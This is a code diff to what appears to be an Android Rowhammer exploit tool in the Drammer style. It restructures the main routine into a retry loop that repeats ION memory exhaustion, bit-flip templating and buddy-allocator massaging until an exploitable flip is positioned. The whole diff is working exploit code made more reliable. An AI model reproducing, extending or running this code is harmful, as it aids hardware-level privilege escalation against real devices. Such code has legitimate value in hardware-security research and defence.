@@ -295,8 +295,7 @@ int main(int argc, char *argv[]) {
     else
         patterns = {&p101, &p010};
 
-    do {
-        if (original) {
+    if (original) {
             /*** EXHAUST */
             printf("[MAIN] Exhaust ION chunks for templating\n");
             exhaust(ion_chunks, rowsize * 4);
@@ -304,8 +303,15 @@ int main(int argc, char *argv[]) {
             /*** TEMPLATE */
             printf("[MAIN] Start templating\n");
             TMPL_run(ion_chunks, templates, patterns, timer, hammer_readcount, do_conservative);
-            break;
-        } else {
+    } else {
+        uint16_t run_cnt = 0;
+        do {
+            if (run_cnt) {
+                ION_clean_all(ion_chunks);
+                ion_chunks.clear();
+                templates.clear();
+            }
+            run_cnt++;
             get_buddy_info();
             // Exhaust L
             printf("[MAIN] Exhaust L (4MB) ION chunks for templating\n");
@@ -320,7 +326,7 @@ int main(int argc, char *argv[]) {
             struct template_t *first_expl = get_first_exploitable_flip(templates);
             if (first_expl == NULL) {
                 printf("[TMPL] - No exploitable flip found.\n");
-                break;
+                continue;
             }
 
             // Exhaust M
@@ -335,7 +341,7 @@ int main(int argc, char *argv[]) {
             uintptr_t expl_row = first_expl->virt_addr & 0xffff0000;
             if (expl_row == (uintptr_t)first_expl->ion_chunk->mapping) {
                 printf("[TMPL] - M* at edge of L*\n");
-                break;
+                continue;
             }
             ION_clean(first_expl->ion_chunk);
 
@@ -346,15 +352,15 @@ int main(int argc, char *argv[]) {
             if (count != 64) {
                 // M doesn't use free space of L*
                 printf("[EXHAUST M] - size mismatch\n");
-                break;
+                continue;
             }
 
-//            count = 0;
-//            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
-//                print("[MAIN] New M at va %p\n", (*it)->mapping);
-//                count++;
-//                if (count == 64) break;
-//            }
+            count = 0;
+            for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
+                print("[MAIN] New M at va %p\n", (*it)->mapping);
+                count++;
+                if (count == 64) break;
+            }
 
             // Free M* and all L
             bool addr_correct = false;
@@ -370,7 +376,7 @@ int main(int argc, char *argv[]) {
             }
             if (!addr_correct) {
                 printf("[FREE] - M* address is not correct\n");
-                break;
+                continue;
             }
 
             // Allocate S until S start to land in M*
@@ -380,7 +386,7 @@ int main(int argc, char *argv[]) {
             get_buddy_info("Normal", free);
             if (free[4] != 1) {
                 printf("[MAIN] More than one 64K holes\n");
-                break;
+                continue;
             }
             while (true) {
                 count = ION_bulk(K(4), ion_chunks, 1, false);
@@ -396,8 +402,9 @@ int main(int argc, char *argv[]) {
             // Allocate padding S until the next place will be vulnerable
 
             break;
-        }
-    } while(true);
+        } while(true);
+        printf("[END] Run %u time(s)\n", run_cnt);
+    }
 
     /*** CLEAN UP */
     ION_clean_all(ion_chunks);
